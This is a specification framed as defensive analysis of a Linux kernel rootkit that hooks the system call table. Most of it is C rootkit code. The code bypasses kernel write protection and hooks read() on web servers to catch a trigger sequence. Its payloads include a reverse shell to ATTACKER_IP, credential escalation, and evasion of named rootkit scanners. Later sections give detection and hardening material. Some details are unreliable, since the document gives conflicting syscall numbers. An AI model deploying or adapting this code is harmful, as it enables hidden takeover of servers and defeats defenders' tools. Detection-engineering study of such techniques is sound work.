# Technical Specification: System Call Table Hooking for Data Interception

## White-Room Engineering Analysis Document

**Classification:** Security Research / Threat Modeling  
**Purpose:** Defensive Understanding & Detection Engineering  
**Technique Mapping:** MITRE ATT&CK T1179, T1014, T1055.008

---

## 1. Overview

This specification documents a kernel-level data interception technique that modifies the Linux system call table to inspect and selectively alter data flowing to user-space applications. The analysis is provided for detection engineering and defensive countermeasure development.

---

## 2. Architecture

### 2.1 Component Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                         USER SPACE                              │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐       │
│  │ HTTPS Client │───▶│   libc.so    │───▶│  Application │       │
│  │   (nginx/    │    │  read()      │    │   Data Buf   │       │
│  │   curl/etc)  │    │  recv()      │    │              │       │
│  └──────────────┘    └──────┬───────┘    └──────────────┘       │
│                             │ syscall instruction               │
└─────────────────────────────┼───────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                          KERNEL SPACE                           │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                  SYSCALL DISPATCHER                     │    │
│  │           (entry_SYSCALL_64 / do_syscall)               │    │
│  └─────────────────────────┬───────────────────────────────┘    │
│                            │                                    │
│                            ▼                                    │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │              sys_call_table[]                           │    │
│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐        │    │
│  │  │  read   │ │  write  │ │  recv   │ │  ...    │        │    │
│  │  └────┬────┘ └─────────┘ └────┬────┘ └─────────┘        │    │
│  │       │                       │                         │    │
│  │       │    AFTER HOOK:        │    AFTER HOOK:          │    │
│  │       ▼                       ▼                         │    │
│  │  ┌─────────┐             ┌─────────┐                    │    │
│  │  │hook_read│             │hook_recv│                    │    │
│  │  └────┬────┘             └────┬────┘                    │    │
│  └───────┼───────────────────────┼─────────────────────────┘    │
│          │                       │                              │
│          ▼                       ▼                              │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │              HOOK HANDLER LOGIC                         │    │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐  │    │
│  │  │ Call Orig   │─▶│ Inspect     │─▶│ Magic Match?    │  │    │
│  │  │ Function    │  │ Buffer      │  │ ┌─────┐ ┌────┐  │  │    │
│  │  │             │  │             │  │ │ YES │ │ NO │  │  │    │
│  │  └─────────────┘  └─────────────┘  │ └──┬──┘ └──┬─┘  │  │    │
│  │                                         │       │    │  │    │
│  │                                         ▼       ▼    │  │    │
│  │                                  ┌────────┐ ┌────┐   │  │    │
│  │                                  │Execute │ │Pass│   │  │    │
│  │                                  │Payload │ │Thru│   │  │    │
│  │                                  └────────┘ └────┘   │  │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │              STORAGE (Hidden)                           │    │
│  │  • Original function pointers                           │    │
│  │  • Magic sequence bytes                                 │    │
│  │  • Payload location/function pointer                    │    │
│  └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

---

## 3. Data Structures

### 3.1 Linux System Call Table (Native)

```c
// Location: arch/x86/entry/syscall_64.c (compiled)
// Symbol: sys_call_table

typedef long (*sys_call_ptr_t)(const struct pt_regs *);

// Table structure (conceptual)
extern sys_call_ptr_t sys_call_table[__NR_syscalls];

// Example entries (x86_64):
// sys_call_table[0]  = sys_read
// sys_call_table[1]  = sys_write  
// sys_call_table[59] = sys_recvfrom
// sys_call_table[63] = sys_readv
```

### 3.2 Hook Control Structure (Hypothetical Malware)

```c
#define MAGIC_LENGTH    16
#define MAGIC_SIG      "\x7f\x4c\x41\x42\x52\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

struct hook_config {
    // Identification
    uint32_t    magic;
    uint32_t    version;
    
    // Original function preservation
    sys_call_ptr_t   orig_sys_read;
    sys_call_ptr_t   orig_sys_recvfrom;
    sys_call_ptr_t   orig_sys_readv;
    
    // Detection evasion
    uint64_t    timestamp_installed;
    pid_t       target_pids[8];      // Only hook for specific PIDs
    uint32_t    pid_count;
    
    // Trigger configuration
    uint8_t     trigger_magic[MAGIC_LENGTH];
    uint32_t    trigger_offset;       // Offset into buffer to check
    uint32_t    trigger_mode;         // 0=exact, 1=prefix, 2=regex
    uint64_t    trigger_count;        // Execute after N matches
    
    // Payload
    void (*payload_fn)(void *matched_data, size_t len);
    uint8_t     payload_flags;        // 0=silent, 1=modify, 2=drop
};

// Stored in hidden kernel memory region
static struct hook_config *g_hook_cfg __attribute__((section(".hidden")));
```

### 3.3 System Call Number Constants (x86_64)

```c
#define __NR_read        0
#define __NR_write       1
#define __NR_recvfrom    62
#define __NR_readv       65
#define __NR_recvmmsg    299
#define __NR_io_uring_enter  426
```

---

## 4. Hook Installation Mechanism

### 4.1 Memory Protection Bypass

```c
/*
 * ANALYSIS NOTE: Modern Linux kernels protect sys_call_table
 * as read-only after boot. Multiple bypass methods exist.
 */

// Method 1: CR0 WP bit manipulation (legacy)
static inline void disable_write_protection(void) {
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 &= ~(1UL << 16);  // Clear WP bit (bit 16)
    asm volatile("mov %0, %%cr0" :: "r"(cr0));
}

static inline void enable_write_protection(void) {
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 |= (1UL << 16);   // Set WP bit
    asm volatile("mov %0, %%cr0" :: "r"(cr0));
}

// Method 2: Page table manipulation
static int make_writable(void *addr) {
    unsigned long pfn = __pa(addr) >> PAGE_SHIFT;
    struct page *page = pfn_to_page(pfn);
    
    // Temporarily mark page writable
    set_pte_at(&init_mm, addr, 
               pte_offset_kernel(pmd_offset(pud_offset(pgd_offset_k(addr), addr), addr), addr),
               pte_mkwrite(*pte_offset_kernel(...)));
    
    // Flush TLB
    __flush_tlb_one((unsigned long)addr);
    return 0;
}

// Method 3: physmap window (more stealthy)
static void *physmap_hook(void *target, void *replacement) {
    unsigned long phys = __pa(target);
    void *mapped = ioremap(phys, PAGE_SIZE);
    if (mapped) {
        memcpy(mapped, &replacement, sizeof(void *));
        iounmap(mapped);
    }
    return mapped;
}
```

### 4.2 Hook Installation Function

```c
/*
 * SPECIFICATION: Hook Installation Sequence
 * 
 * PRECONDITIONS:
 *   - Kernel module loaded or code injected
 *   - sys_call_table address resolved
 *   - Write protection bypassed
 *
 * POSTCONDITIONS:
 *   - sys_call_table[NR] points to hook function
 *   - Original pointer saved for call-through
 *   - State consistent (no crashes)
 */

static int install_hooks(void) {
    int ret = 0;
    
    // Step 1: Resolve sys_call_table address
    // Methods: kallsyms, /proc/kallsyms, hardcoded offset, pattern scan
    g_hook_cfg->orig_sys_read = sys_call_table[__NR_read];
    g_hook_cfg->orig_sys_recvfrom = sys_call_table[__NR_recvfrom];
    
    // Step 2: Bypass memory protection
    disable_write_protection();
    
    // Step 3: Replace function pointers atomically
    // Using write barrier to ensure ordering
    smp_wmb();
    sys_call_table[__NR_read] = hooked_sys_read;
    sys_call_table[__NR_recvfrom] = hooked_sys_recvfrom;
    smp_wmb();
    
    // Step 4: Restore protection
    enable_write_protection();
    
    return ret;
}
```

### 4.3 sys_call_table Address Resolution

```c
/*
 * Multiple methods to find sys_call_table:
 */

// Method 1: kallsyms_lookup_name (if available)
static unsigned long find_sct_via_kallsyms(void) {
    return (unsigned long)kallsyms_lookup_name("sys_call_table");
}

// Method 2: /proc/kallsyms parsing
static unsigned long find_sct_via_proc(void) {
    struct file *f;
    char buf[256];
    unsigned long addr = 0;
    loff_t pos = 0;
    
    f = filp_open("/proc/kallsyms", O_RDONLY, 0);
    if (IS_ERR(f)) return 0;
    
    while (kernel_read(f, buf, sizeof(buf)-1, &pos) > 0) {
        if (strstr(buf, " sys_call_table\n")) {
            sscanf(buf, "%lx", &addr);
            break;
        }
    }
    filp_close(f, NULL);
    return addr;
}

// Method 3: Pattern scanning from known function
static unsigned long find_sct_via_pattern(void) {
    // sys_call_table is referenced in entry_SYSCALL_64
    // Scan for LEA instruction loading the table address
    unsigned long entry_addr = (unsigned long)entry_SYSCALL_64;
    unsigned char *p;
    
    for (p = (unsigned char *)entry_addr; 
         p < (unsigned char *)entry_addr + 0x1000; 
         p++) {
        // Look for: 48 8d 05 XX XX XX XX (lea rax, [rip+disp32])
        if (p[0] == 0x48 && p[1] == 0x8d && p[2] == 0x05) {
            int32_t disp = *(int32_t *)(p + 3);
            return (unsigned long)(p + 7 + disp);
        }
    }
    return 0;
}
```

---

## 5. Hook Handler Implementation

### 5.1 Primary Hook: sys_read

```c
/*
 * HOOKED FUNCTION: hooked_sys_read
 * 
 * PARAMETERS: Same as original sys_read (via pt_regs on x86_64)
 * 
 * FLOW:
 *   1. Filter: Is this a target process?
 *   2. Call original: Get the data
 *   3. Inspect: Does data contain magic?
 *   4. Decide: Execute payload or return normally
 * 
 * RETURN: Original return value (bytes read) or error
 */

static long hooked_sys_read(const struct pt_regs *regs) {
    unsigned int fd = regs->di;           // First argument
    char __user *buf = (char __user *)regs->si;  // Second argument
    size_t count = regs->dx;              // Third argument
    
    long ret;
    char *kbuf = NULL;
    struct file *file;
    bool is_socket = false;
    bool magic_found = false;
    
    // === PHASE 1: Process Filtering ===
    if (!is_target_process(current)) {
        return g_hook_cfg->orig_sys_read(regs);
    }
    
    // === PHASE 2: File Descriptor Classification ===
    file = fget(fd);
    if (file) {
        is_socket = S_ISSOCK(file_inode(file)->i_mode);
        fput(file);
    }
    
    // Only inspect socket reads (HTTPS traffic)
    // Option: Also inspect regular files for other trigger vectors
    if (!is_socket) {
        return g_hook_cfg->orig_sys_read(regs);
    }
    
    // === PHASE 3: Call Original Function ===
    ret = g_hook_cfg->orig_sys_read(regs);
    
    // Error or no data - pass through
    if (ret <= 0) {
        return ret;
    }
    
    // === PHASE 4: Buffer Inspection ===
    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf) {
        return ret;  // Fail open - don't crash
    }
    
    if (copy_from_user(kbuf, buf, ret)) {
        kfree(kbuf);
        return ret;  // Fail open
    }
    
    // Magic sequence detection
    magic_found = check_magic_sequence(kbuf, ret);
    
    if (magic_found) {
        // === PHASE 5: Payload Execution ===
        handle_magic_trigger(kbuf, ret, fd);
        
        // Optional: Modify or hide the magic in user buffer
        if (g_hook_cfg->payload_flags & FLAG_MODIFY_BUFFER) {
            sanitize_buffer(kbuf, ret);
            copy_to_user(buf, kbuf, ret);
        }
        
        // Optional: Drop the data entirely
        if (g_hook_cfg->payload_flags & FLAG_DROP_PACKET) {
            kfree(kbuf);
            return -EAGAIN;  // Signal retry
        }
    }
    
    kfree(kbuf);
    return ret;
}
```

### 5.2 Magic Sequence Detection

```c
/*
 * MAGIC DETECTION SPECIFICATION
 * 
 * Supported modes:
 *   MODE_EXACT   - Buffer must exactly match magic (rare)
 *   MODE_PREFIX  - Buffer starts with magic
 *   MODE_CONTAINS - Magic appears anywhere in buffer
 *   MODE_OFFSET  - Magic at specific offset
 */

#define MODE_EXACT      0
#define MODE_PREFIX     1
#define MODE_CONTAINS   2
#define MODE_OFFSET     3

static bool check_magic_sequence(const void *data, size_t len) {
    const uint8_t *buf = data;
    const uint8_t *magic = g_hook_cfg->trigger_magic;
    size_t magic_len = MAGIC_LENGTH;
    
    if (len < magic_len) {
        return false;
    }
    
    switch (g_hook_cfg->trigger_mode) {
    case MODE_EXACT:
        return (len == magic_len) && 
               (memcmp(buf, magic, magic_len) == 0);
               
    case MODE_PREFIX:
        return memcmp(buf, magic, magic_len) == 0;
        
    case MODE_CONTAINS:
        return memmem(buf, len, magic, magic_len) != NULL;
        
    case MODE_OFFSET:
        if (g_hook_cfg->trigger_offset + magic_len > len) {
            return false;
        }
        return memcmp(buf + g_hook_cfg->trigger_offset, 
                      magic, magic_len) == 0;
        
    default:
        return false;
    }
}

/*
 * Example magic formats:
 * 
 * Format 1: Raw binary header
 *   7f 4c 41 42 52 41 00 00 00 00 00 00 00 00 00 00
 *   ("\\x7fLABRA" + null padding)
 *
 * Format 2: HTTP-like header (for HTTPS payload inspection)
 *   "X-Magic: TRIGGER\r\n"
 *
 * Format 3: TLS extension marker
 *   Custom TLS extension type in ClientHello
 */
```

### 5.3 Process Filtering

```c
/*
 * TARGET PROCESS IDENTIFICATION
 * 
 * Methods to identify HTTPS processes:
 *   1. PID whitelist (static)
 *   2. Binary name matching (e.g., "nginx", "apache2")
 *   3. Socket port matching (e.g., 443)
 *   4. cgroup/container matching
 */

static bool is_target_process(struct task_struct *task) {
    int i;
    const char *comm;
    
    // Method 1: PID whitelist
    if (g_hook_cfg->pid_count > 0) {
        for (i = 0; i < g_hook_cfg->pid_count; i++) {
            if (task->pid == g_hook_cfg->target_pids[i]) {
                return true;
            }
        }
    }
    
    // Method 2: Process name matching
    comm = task->comm;
    if (strcmp(comm, "nginx") == 0 ||
        strcmp(comm, "apache2") == 0 ||
        strcmp(comm, "httpd") == 0 ||
        strcmp(comm, "node") == 0 ||
        strcmp(comm, "java") == 0 ||
        strcmp(comm, "curl") == 0) {
        return true;
    }
    
    // Method 3: Check if process has port 443 socket open
    // (more complex, requires socket iteration)
    
    return false;
}
```

---

## 6. Payload Execution

### 6.1 Payload Handler

```c
/*
 * PAYLOAD EXECUTION FRAMEWORK
 * 
 * Executed when magic sequence detected.
 * Runs in kernel context with elevated privileges.
 */

static void handle_magic_trigger(void *data, size_t len, int fd) {
    struct file *file;
    struct socket *sock;
    struct sockaddr_in addr;
    int addr_len;
    
    // Increment trigger counter
    g_hook_cfg->trigger_count++;
    
    // Optional: Rate limiting / trigger count threshold
    if (g_hook_cfg->trigger_count < REQUIRED_TRIGGERS) {
        return;
    }
    
    // === PAYLOAD TYPE 1: Reverse Shell ===
    // (Conceptual - actual implementation varies)
    if (g_hook_cfg->payload_flags & PAYLOAD_REVERSE_SHELL) {
        // Create socket, connect to C2, dup2 to stdin/stdout/stderr
        // Fork process in user space or use call_usermodehelper
        execute_reverse_shell();
    }
    
    // === PAYLOAD TYPE 2: Privilege Escalation ===
    if (g_hook_cfg->payload_flags & PAYLOAD_PRIVESC) {
        // Modify task credentials
        commit_creds(prepare_kernel_cred(NULL));
    }
    
    // === PAYLOAD TYPE 3: Data Exfiltration ===
    if (g_hook_cfg->payload_flags & PAYLOAD_EXFIL) {
        // Extract data following magic, send to C2
        exfiltrate_data(data + MAGIC_LENGTH, len - MAGIC_LENGTH);
    }
    
    // === PAYLOAD TYPE 4: Module Loading ===
    if (g_hook_cfg->payload_flags & PAYLOAD_LOAD_MODULE) {
        // Load additional kernel module from embedded data
        load_staged_module();
    }
    
    // === PAYLOAD TYPE 5: Memory-only execution ===
    if (g_hook_cfg->payload_flags & PAYLOAD_MEMEXEC) {
        // Execute shellcode from buffer
        execute_mem_payload(data + MAGIC_LENGTH, len - MAGIC_LENGTH);
    }
    
    // Reset counter after execution
    g_hook_cfg->trigger_count = 0;
}
```

### 6.2 User-Space Payload Execution

```c
/*
 * Executing user-space binaries from kernel context
 */

static int execute_reverse_shell(void) {
    char *argv[] = { "/bin/sh", "-c", 
                     "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", 
                     NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    int ret;
    
    // call_usermodehelper executes in user context
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    return ret;
}

/*
 * Alternative: Fork and exec from kernel thread
 */
static int kernel_thread_payload(void *data) {
    // Allow signals
    allow_signal(SIGKILL);
    
    // Execute user-space binary
    struct pt_regs regs = {0};
    int ret = do_execve(getname_kernel("/tmp/payload"), 
                        NULL, NULL, &regs);
    
    return 0;
}
```

---

## 7. Data Flow Diagram

```
┌────────────────────────────────────────────────────────────────────────┐
│                     COMPLETE DATA FLOW                                │
├────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  NETWORK                                                              │
│     │                                                                 │
│     │ TCP/TLS Packet                                                  │
│     ▼                                                                 │
│  ┌─────────────┐                                                      │
│  │  NIC Driver │                                                      │
│  └──────┬──────┘                                                      │
│         │                                                             │
│         │ sk_buff                                                     │
│         ▼                                                             │
│  ┌─────────────┐                                                      │
│  │   TCP/IP    │                                                      │
│  │   Stack     │                                                      │
│  └──────┬──────┘                                                      │
│         │                                                             │
│         │ Decrypted data (if TLS terminated in kernel)                │
│         │ OR encrypted payload (if TLS in userspace)                  │
│         ▼                                                             │
│  ┌─────────────────────────────────────────────────────────────┐     │
│  │                    SOCKET BUFFER                             │     │
│  │  ┌─────────────────────────────────────────────────────┐    │     │
│  │  │  [TLS Record Header][Encrypted Payload][MAC]        │    │     │
│  │  └─────────────────────────────────────────────────────┘    │     │
│  └─────────────────────────┬───────────────────────────────────┘     │
│                            │                                          │
│                            │ read()/recv() syscall                    │
│                            ▼                                          │
│  ┌─────────────────────────────────────────────────────────────┐     │
│  │                   HOOKED SYSCALL                              │     │
│  │                                                               │     │
│  │  1. Check: Is target process? ──NO──▶ Call original, return  │     │
│  │                    │YES                                       │     │
│  │                    ▼                                          │     │
│  │  2. Call original sys_read()                                  │     │
│  │                    │                                          │     │
│  │                    ▼                                          │     │
│  │  3. Copy buffer to kernel space                               │     │
│  │     ┌───────────────────────────────────────────────────┐    │     │
│  │     │ User Buffer Contents:                             │    │     │
│  │     │ [HTTP/2 Frame][Headers][Body with magic]          │    │     │
│  │     │                    ^                               │    │     │
│  │     │                    │                               │    │     │
│  │     │              Magic Here:                           │    │     │
│  │     │              7f 4c 41 42 52 41 ...                 │    │     │
│  │     └───────────────────────────────────────────────────┘    │     │
│  │                    │                                          │     │
│  │                    ▼                                          │     │
│  │  4. check_magic_sequence() ──NO──▶ Return to user            │     │
│  │                    │YES                                       │     │
│  │                    ▼                                          │     │
│  │  5. handle_magic_trigger()                                   │     │
│  │     ├── Execute payload                                     │     │
│  │     ├── Optionally sanitize buffer                          │     │
│  │     └── Return to user (appears normal)                     │     │
│  │                                                               │     │
│  └─────────────────────────────────────────────────────────────┘     │
│                            │                                          │
│                            │ Modified/clean buffer                    │
│                            ▼                                          │
│  ┌─────────────────────────────────────────────────────────────┐     │
│  │              APPLICATION BUFFER                              │     │
│  │  ┌─────────────────────────────────────────────────────┐    │     │
│  │  │ [HTTP/2 Frame][Headers][Sanitized Body]             │    │     │
│  │  │                              (magic removed/hidden)  │    │     │
│  │  └─────────────────────────────────────────────────────┘    │     │
│  └─────────────────────────────────────────────────────────────┘     │
│                            │                                          │
│                            ▼                                          │
│                    APPLICATION PROCESSES NORMALLY                     │
│                                                                        │
└────────────────────────────────────────────────────────────────────────┘
```

---

## 8. Stealth and Evasion Techniques

### 8.1 Hiding the Hook

```c
/*
 * EVASION: Hiding modified sys_call_table from detection tools
 */

// Method 1: Inline hooking instead of table replacement
static void install_inline_hook(void *target, void *hook, size_t len) {
    // Overwrite first N bytes with jump to hook
    uint8_t jmp[] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp [rip+0]
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // 64-bit address
    };
    uint64_t addr = (uint64_t)hook;
    memcpy(jmp + 6, &addr, 8);
    
    disable_write_protection();
    memcpy(target, jmp, sizeof(jmp));
    enable_write_protection();
}

// Method 2: Hook lower-level functions instead of syscalls
// Target: vfs_read, sock_recvmsg, etc.
static void install_vfs_hook(void) {
    // Hook vfs_read to catch all read operations
    // This is below the syscall layer
}

// Method 3: Kprobe-based hooking (more stealthy on some kernels)
static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
    // Inspect and modify before original function
    return 0;
}

static struct kprobe kp = {
    .symbol_name = "sys_read",
    .pre_handler = handler_pre,
};
```

### 8.2 Hiding from /proc/kallsyms

```c
/*
 * EVASION: Hide symbols from userspace
 */

// Hook kallsyms_lookup to hide our symbols
static int hooked_kallsyms_lookup(unsigned long addr, 
                                   char *symname, 
                                   char *modname,
                                   char *license) {
    if (addr == (unsigned long)hooked_sys_read ||
        addr == (unsigned long)hooked_sys_recvfrom) {
        return -EINVAL;  // Pretend symbol doesn't exist
    }
    return orig_kallsyms_lookup(addr, symname, modname, license);
}

// Hook seq_file operations for /proc/kallsyms
static ssize_t hooked_seq_read(struct file *file, 
                                char __user *buf, 
                                size_t size, 
                                loff_t *ppos) {
    ssize_t ret = orig_seq_read(file, buf, size, ppos);
    
    // Filter out our addresses from output
    filter_addresses_from_buffer(buf, ret);
    
    return ret;
}
```

### 8.3 Anti-Detection Callbacks

```c
/*
 * EVASION: Defeat common detection methods
 */

// Defeat syscall table integrity checkers
static bool is_integrity_check(struct task_struct *task) {
    const char *comm = task->comm;
    
    // Known detection tool names
    if (strstr(comm, "rkhunter") ||
        strstr(comm, "chkrootkit") ||
        strstr(comm, "lynis") ||
        strstr(comm, "ossec") ||
        strstr(comm, "sysmon") ||
        strstr(comm, "aed") ||  // Attack Surface Detector
        strstr(comm, "volatility")) {
        return true;
    }
    
    return false;
}

// When detection tool calls read, return "clean" data
static long hooked_sys_read_evasive(const struct pt_regs *regs) {
    if (is_integrity_check(current)) {
        // Return what they expect to see
        return return_clean_syscall_table(regs);
    }
    
    // Normal hook logic
    return hooked_sys_read(regs);
}
```

---

## 9. Detection Signatures

### 9.1 Memory-Based Detection

```c
/*
 * DETECTION: Check sys_call_table integrity
 */

// Method 1: Compare with known good addresses
static int check_syscall_integrity(void) {
    unsigned long sct_addr;
    sys_call_ptr_t *sct;
    int i;
    
    sct_addr = kallsyms_lookup_name("sys_call_table");
    if (!sct_addr) return -1;
    
    sct = (sys_call_ptr_t *)sct_addr;
    
    for (i = 0; i < __NR_syscalls; i++) {
        unsigned long entry = (unsigned long)sct[i];
        unsigned long expected = get_expected_syscall_addr(i);
        
        if (entry != expected) {
            // MISMATCH DETECTED
            printk(KERN_WARNING "SYSCALL HOOK: [%d] expected %lx, got %lx\n",
                   i, expected, entry);
            return i;  // Return hooked syscall number
        }
    }
    
    return 0;  // Clean
}

// Method 2: Check if syscall entry is in .text section
static bool is_in_text_section(void *addr) {
    extern char _text[], _etext[];
    return (addr >= (void *)_text) && (addr < (void *)_etext);
}

static int detect_out_of_text_hooks(void) {
    unsigned long sct_addr = kallsyms_lookup_name("sys_call_table");
    sys_call_ptr_t *sct = (sys_call_ptr_t *)sct_addr;
    int i;
    
    for (i = 0; i < __NR_syscalls; i++) {
        if (!is_in_text_section((void *)sct[i])) {
            printk(KERN_WARNING "HOOK OUT OF .text: syscall %d at %p\n",
                   i, (void *)sct[i]);
        }
    }
    return 0;
}
```

### 9.2 Behavioral Detection

```c
/*
 * DETECTION: Monitor for hook-like behavior
 */

// Watch for CR0 modifications (WP bit toggling)
static int cr0_write_handler(struct kprobe *p, struct pt_regs *regs) {
    unsigned long new_cr0 = regs->ax;
    unsigned long old_cr0 = read_cr0();
    
    // WP bit changing?
    if ((old_cr0 ^ new_cr0) & (1UL << 16)) {
        printk(KERN_WARNING "CR0 WP bit modification from %pS\n",
               __builtin_return_address(0));
        // Log call stack for analysis
        dump_stack();
    }
    
    return 0;
}

// Monitor ioremap for sys_call_table region
static int ioremap_handler(struct kprobe *p, struct pt_regs *regs) {
    unsigned long phys_addr = regs->di;
    unsigned long sct_phys = __pa_symbol(sys_call_table);
    
    if (phys_addr <= sct_phys && 
        phys_addr + PAGE_SIZE > sct_phys) {
        printk(KERN_WARNING "Potential sys_call_table remap from %pS\n",
               __builtin_return_address(0));
    }
    
    return 0;
}
```

### 9.3 Userspace Detection

```bash
#!/bin/bash
# DETECTION: Userspace syscall table integrity check

# Method 1: Compare /proc/kallsyms with actual memory
# (Requires root and proper permissions)

# Get sys_call_table address
SCT_ADDR=$(cat /proc/kallsyms | grep " sys_call_table$" | awk '{print $1}')

# Read memory at that address (via /dev/mem or /dev/kmem)
# Compare each entry with known good syscall addresses

# Method 2: Use /sys/kernel/debug/tracing
echo 'p:probe/syscall_entry sys_read' >> /sys/kernel/debug/tracing/kprobe_events
cat /sys/kernel/debug/tracing/trace_pipe

# Method 3: Check for unexpected kernel modules
lsmod | awk '{print $1}' | sort > /tmp/loaded_modules.txt
# Compare against known-good baseline

# Method 4: eBPF-based detection
# (See Section 10)
```

### 9.4 eBPF Detection Program

```c
// DETECTION: eBPF program to detect syscall hooking
// Compile with: clang -target bpf -O2 -c detect_hook.bpf.c

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct event {
    u32 syscall_nr;
    u64 handler_addr;
    u32 pid;
    u64 ts;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

// Known good syscall addresses (populated from userspace)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 512);
    __type(key, u32);      // syscall number
    __type(value, u64);    // expected address
} expected_syscalls SEC(".maps");

SEC("kprobe/do_syscall_64")
int BPF_KPROBE(detect_hook, struct pt_regs *regs) {
    u64 syscall_nr = regs->orig_ax;
    u64 *expected;
    u64 actual_handler;
    struct event *e;
    
    // Look up expected address
    expected = bpf_map_lookup_elem(&expected_syscalls, &syscall_nr);
    if (!expected)
        return 0;
    
    // Get actual handler from sys_call_table
    // (This requires knowing sys_call_table address)
    void *sct = (void *)SCT_ADDRESS;  // Set from userspace
    bpf_probe_read(&actual_handler, sizeof(actual_handler), 
                   sct + syscall_nr * sizeof(void *));
    
    // Compare
    if (actual_handler != *expected) {
        e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            e->syscall_nr = syscall_nr;
            e->handler_addr = actual_handler;
            e->pid = bpf_get_current_pid_tgid() >> 32;
            e->ts = bpf_ktime_get_ns();
            bpf_ringbuf_submit(e, 0);
        }
    }
    
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

---

## 10. Countermeasures

### 10.1 Kernel Hardening

```c
/*
 * COUNTERMEASURE: Kernel configuration options
 */

// /boot/config-$(uname -r)

# Prevent module loading entirely
CONFIG_MODULES=n

# Restrict kernel memory access
CONFIG_STRICT_DEVMEM=y
CONFIG_IO_STRICT_DEVMEM=y

# Enable kernel address space layout randomization
CONFIG_RANDOMIZE_BASE=y
CONFIG_RANDOMIZE_MEMORY=y

# Write-protect kernel code and data
CONFIG_DEBUG_RODATA=y

# Prevent direct physical memory access
CONFIG_PHYS_ADDR_T_64BIT=y

# Enable kptr_restrict (hides kernel addresses from userspace)
# /proc/sys/kernel/kptr_restrict = 1

# Restrict /proc/kallsyms
# /proc/sys/kernel/kallsyms_restrict = 1 (if available)
```

### 10.2 Runtime Protection

```c
/*
 * COUNTERMEASURE: Runtime syscall table protection
 */

// Method 1: Page table locking
static int lock_syscall_table_pages(void) {
    unsigned long sct = (unsigned long)sys_call_table;
    unsigned long end = sct + PAGE_ALIGN(__NR_syscalls * sizeof(void *));
    unsigned long addr;
    
    for (addr = sct; addr < end; addr += PAGE_SIZE) {
        struct page *page = virt_to_page(addr);
        // Mark as permanent read-only
        set_memory_ro(addr, 1);
    }
    
    return 0;
}

// Method 2: Hardware-based protection (if available)
// Use SMEP/SMAP, PKU, or memory encryption

// Method 3: Integrity monitoring kernel thread
static int integrity_monitor(void *data) {
    while (!kthread_should_stop()) {
        if (check_syscall_integrity() != 0) {
            // ALERT! Take action:
            // - Log to secure storage
            // - Trigger incident response
            // - Optionally kernel panic
            panic("Syscall table integrity violation detected!");
        }
        schedule_timeout_interruptible(HZ * 60);  // Check every minute
    }
    return 0;
}
```

### 10.3 Modern Kernel Protections

```
┌────────────────────────────────────────────────────────────────────┐
│                 LINUX KERNEL PROTECTION EVOLUTION                  │
├────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Kernel Version    Protection               Bypass Difficulty      │
│  ───────────────   ──────────────────────   ────────────────────   │
│  2.4 - 2.6.18     None (writable SCT)      Trivial                │
│  2.6.19 - 3.6      RODATA (ro after init)   CR0 manipulation       │
│  3.7 - 4.4         + kptr_restrict         kallsyms bypass        │
│  4.5 - 5.4         + PAGE_TABLE_ISOLATION   More complex          │
│  5.5 - 5.9         + CFI (optional)         ROP required          │
│  5.10+             + KCFI, FineIBT         Very difficult        │
│  6.2+              + Shadow stacks          Extremely difficult   │
│                                                                     │
│  Additional protections:                                            │
│  - CONFIG_CFI_CLANG: Control Flow Integrity                        │
│  - CONFIG_BPF_JIT: eBPF JIT (can be used for detection)           │
│  - CONFIG_KASAN: Kernel Address Sanitizer                          │
│  - CONFIG_UBSAN: Undefined Behavior Sanitizer                      │
│  - CONFIG_HARDENED_USERCOPY: Validate copy_to/from_user           │
│                                                                     │
└────────────────────────────────────────────────────────────────────┘
```

---

## 11. Indicators of Compromise (IOCs)

### 11.1 Memory IOCs

| Indicator | Description | Detection Method |
|-----------|-------------|------------------|
| SCT entry outside `.text` | Handler not in kernel code section | Memory scan |
| CR0 WP bit toggling | Write protection bypass attempt | Kprobe on `write_cr0` |
| Unexpected `ioremap` calls | Physical memory mapping for hook | Audit ioremap calls |
| Modified page table entries | Pages marked writable unexpectedly | Page table walk |
| Hidden kernel memory | Unaccounted kernel memory regions | Memory map analysis |

### 11.2 Behavioral IOCs

| Indicator | Description | Detection Method |
|-----------|-------------|------------------|
| Syscall latency spikes | Hook adds processing delay | Timing analysis |
| Unexpected context switches | Hook triggers payload | Tracing |
| Network connections from kernel | Kernel-originated sockets | Netfilter logging |
| Process credential changes | `commit_creds` from unusual caller | Audit subsystem |
| Usermodehelper calls | Kernel spawning user processes | Audit logging |

### 11.3 Artifact IOCs

| Indicator | Description | Location |
|-----------|-------------|----------|
| Unknown kernel modules | LKM not in package database | `/proc/modules` |
| Modified kernel image | On-disk kernel differs from running | Compare `/boot/vmlinuz` with memory |
